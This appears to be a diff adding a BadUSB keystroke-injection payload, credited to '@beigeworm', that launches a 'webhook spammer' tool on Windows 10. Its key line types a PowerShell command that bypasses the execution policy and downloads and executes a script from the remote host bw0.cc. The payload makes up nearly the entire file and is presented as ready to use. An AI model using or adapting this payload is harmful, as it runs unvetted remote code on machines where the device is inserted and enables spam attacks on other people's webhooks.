@@ -1,0 +1,13 @@
+REM Title: beigeworm's Webhook Spammer GUI Tool.
+REM Author: @beigeworm
+REM Description: This script creates a GUI for Spamming a webhook with text or an image.
+REM Target: Windows 10
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C iex (irm bw0.cc/whspam)
+ENTER
+
+
